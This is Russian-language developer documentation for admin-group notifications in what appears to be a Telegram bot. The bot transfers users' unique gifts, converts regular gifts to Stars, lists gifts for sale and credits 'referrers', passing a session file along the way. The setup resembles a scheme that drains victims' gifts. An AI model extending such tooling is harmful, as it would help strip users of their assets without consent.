# Детальное логирование передачи подарков в админ группу

## Обзор изменений

Система автоматической передачи подарков теперь отправляет подробные уведомления в админ группу на каждом этапе процесса.

## Типы уведомлений

### 1. 🎁 Начало передачи подарков

Отправляется в начале процесса передачи уникальных подарков:

```
🎁 Начало передачи подарков

👤 Пользователь: ID 123456789
💎 Всего уникальных подарков: 10
📊 Подлежит передаче: 8
⭐ Баланс Stars: 120
```

### 2. ❌ Ошибка передачи подарка

Отправляется при неудачной передаче отдельного подарка (максимум 3 уведомления, чтобы не спамить):

```
❌ Ошибка передачи подарка

👤 Пользователь: ID 123456789
💎 msg_id: 186731
📊 Прогресс: 5/10 успешно, 1 ошибок
```

### 3. 💫 Результат отправки обычных подарков

Отправляется после завершения отправки обычных подарков:

```
💫 Результат отправки обычных подарков

👤 Пользователь: ID 123456789
✅ Отправлено: 3
❌ Ошибок: 0
💰 Потрачено Stars: 45
```

### 4. ⚠️ Ошибка при передаче подарков

Отправляется при критических ошибках в процессе:

**Типы ошибок:**
- `conversion_failed` - Не удалось конвертировать обычные подарки в Stars
- `sell_failed` - Не удалось выставить уникальный подарок на продажу
- `no_sellable_gift` - Не найдено уникальных подарков для продажи

```
⚠️ Ошибка при передаче подарков

👤 Пользователь: @username (ID: 123456789)
👤 Рефер: @referrer (ID: 987654321)

🔴 Тип ошибки: sell_failed
📝 Детали: Не удалось выставить уникальный подарок на продажу (msg_id=186731). 
           Недостаточно Stars: 50/120
```

### 5. ✅/❌ Итоговое уведомление

Отправляется в конце процесса с полной статистикой:

```
✅ Передача подарков - Успешно

👤 Рефер: @referrer (ID: 987654321)
👤 Пользователь: @username (ID: 123456789)

📊 Статистика:

💎 Уникальные подарки:
  ✅ Передано: 8
  ❌ Ошибок: 1
  ⏭ Пропущено: 1 (еще нельзя передать)

💫 Обычные подарки:
  ✅ Отправлено: 3
  ❌ Ошибок: 0

🔍 Не удалось передать (msg_id): 186731

💰 Общая стоимость: 165 Stars

📝 Детали: Передано уникальных подарков: 8, Ошибок: 1. 
           Обычных подарков отправлено на 45 Stars
```

## Структура данных

### Функция `format_gift_transfer_notification`

Новые параметры:
- `unique_transferred` - Количество успешно переданных уникальных подарков
- `unique_failed` - Количество неудачных передач уникальных подарков
- `unique_skipped` - Количество пропущенных подарков (еще нельзя передать)
- `regular_sent` - Количество отправленных обычных подарков
- `regular_failed` - Количество неудачных отправок обычных подарков
- `failed_gift_ids` - Список msg_id подарков, которые не удалось передать

### Функция `send_gift_transfer_error`

Отправляет уведомление о критической ошибке:
- `user_id` - ID пользователя
- `user_username` - Username пользователя
- `error_type` - Тип ошибки
- `error_details` - Детальное описание ошибки
- `referrer_id` - ID реферера (опционально)
- `referrer_username` - Username реферера (опционально)

## Логика уведомлений

### Частота отправки

1. **Начало процесса** - 1 уведомление
2. **Ошибки передачи** - До 3 уведомлений (чтобы не спамить)
3. **Обычные подарки** - 1 уведомление (если были отправлены)
4. **Критические ошибки** - По необходимости
5. **Итоговое уведомление** - 1 уведомление

### Условия отправки

- Уведомления отправляются только при наличии bot token
- При ошибке отправки уведомления процесс продолжается
- Все уведомления логируются в консоль: `[ADMIN-NOTIFY] [OK/ERROR]`

## Настройки

### ID админ группы

Определен в `server/utils/send_admin_notification.py`:

```python
ADMIN_GROUP_ID = -5012251055
```

### Лимит уведомлений об ошибках

В коде передачи подарков:

```python
if failed <= 3:  # Only send first 3 failures to avoid spam
    await send_admin_notification(...)
```

## Примеры использования

### Отправка уведомления о начале процесса

```python
await send_admin_notification(
    f"🎁 Начало передачи подарков\n\n"
    f"👤 Пользователь: ID {user_id}\n"
    f"💎 Всего уникальных подарков: {total}\n"
    f"⭐ Баланс Stars: {balance}"
)
```

### Отправка уведомления об ошибке

```python
await send_gift_transfer_error(
    user_id=user_id,
    user_username=username,
    error_type="sell_failed",
    error_details="Не удалось выставить подарок на продажу",
    referrer_id=referrer_id,
    referrer_username=referrer_username
)
```

### Итоговое уведомление

```python
notification = format_gift_transfer_notification(
    user_id=user_id,
    user_username=username,
    success=True,
    details="Подробности...",
    referrer_id=referrer_id,
    referrer_username=referrer_username,
    total_gifts_value=total,
    unique_transferred=transferred,
    unique_failed=failed,
    unique_skipped=skipped,
    regular_sent=sent,
    regular_failed=failed_regular,
    failed_gift_ids=[186731, 186732]
)
await send_admin_notification(notification, session_file)
```

## Отладка

### Проверка отправки уведомлений

В логах консоли:
```
[ADMIN-NOTIFY] [OK] Message sent to admin group
[ADMIN-NOTIFY] [ERROR] Failed to send message: <error>
```

### Проверка получения в админ группе

1. Убедитесь, что бот добавлен в админ группу с ID `-5012251055`
2. Бот должен иметь права на отправку сообщений
3. Bot token должен быть корректным

## Интеграция с реферальной системой

Все уведомления включают информацию о рефере (если пользователь пришел по реферальной ссылке):
- ID реферера
- Username реферера
- ID пользователя
- Username пользователя

Это позволяет отслеживать эффективность реферальной программы.
